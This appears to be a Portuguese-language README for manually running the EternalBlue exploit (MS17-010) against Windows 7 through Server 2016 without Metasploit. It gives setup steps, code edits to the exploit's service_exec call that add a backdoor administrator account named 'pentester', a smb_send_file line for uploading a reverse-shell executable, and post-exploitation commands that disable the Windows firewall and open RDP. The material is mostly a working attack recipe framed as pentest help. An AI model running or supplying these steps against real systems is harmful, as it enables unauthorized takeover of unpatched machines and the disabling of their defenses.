# Exploiting Windows 7, 8.1, 2008 R2, 2012 R2, 2016 R2, 2016 Server etc Com Eternalblue SEM METASPLOIT (MS17-010) (CVE 2017-0144)

Script que explora manualmente a vulnerabilidade MS17-010 (CVE 2017-0144 ) e funciona nos sistemas: Windows 7 / 8.1 / 2008 R2 /2012 R2 / 2016 R2 / 2016 Server

**Exploit tirado do exploit-db - [42315](https://www.exploit-db.com/exploits/42315])**

**Testado no Windows 2016 Server**

Criei esse respositório pois quando precisei, tive dificuldade para executar o exploit (baixar depedências) e entender o código, sendo assim decidi criar esse repositório para facilitar o pentest caso alguém se depare com o mesmo problema que eu

## Preparando o ambiente para executar o exploit

Necessário python2 (python2.7) 
```bash
$ sudo apt update
$ sudo apt upgrade
$ sudo apt install python2.7
```
Necessário pip2
```bash
$ curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py;
$ python2 get-pip.py;
$ rm get-pip.py;
```
Baixando pacotes necessários
```bash
$ pip2 install --upgrade setuptools;
$ pip2 install impacket==0.9.22
```

## Alterações no exploit
A lógica é usar a função **smb_send_file** para enviar um executável de shell reversa, e a função **service_exec** para executar o código. 
Porém devido ao Windows Defender não da para realizar isso diretamente. 

*A função **service_exec** (linha 923) é onde se localiza o comando que será executado como é mostrado abaixo*
*A função **smb_send_file** (linha 922) envia um arquivo local para a máquina alvo*


- Alterações para criar um usuário com acesso de Autoridade
```python 
service_exec(conn, r'cmd /c net user pentester Pentester123 /add') # linha - 923
# criando o usuário 'pentester' com a senha 'Pentester123'
```
```python 
service_exec(conn, r'cmd /c net localgroup administrators pentester /add') # linha - 923
# Adicionando o usuário 'pentester' ao grupo de administradores
```
- Alteração para enviar um arquivo local para a máquina alvo
```shell
smb_send_file(smbConn, '/path_to_your_filel/eternal-blue.exe', 'C', '/eternal-blue.exe') # Arquivo é inserido na raiz (c:\) neste exemplo
```
 
Caso você queira tentar ganhar uma shell reversa vou deixar os comandos necessários abaixo

## Executando o Exploit
```bash
$ python2.7 exploit.py <target ip>
```

## Comandos úteis do Windows para pentest
- Comando para desligar o Firewall do Windows
```shell
netsh advfirewall set currentprofile state off
```
- Comando para habilitar a porta 3389 no firewall
```shell
netsh advfirewall firewall add rule name="rpd" protocol=TCP dir=in localport=3389 action=allow
```
- Comando para habilitar o RDP no Windows
```shell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
- Comando para desabilitar o RDP no Windows
```shell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```
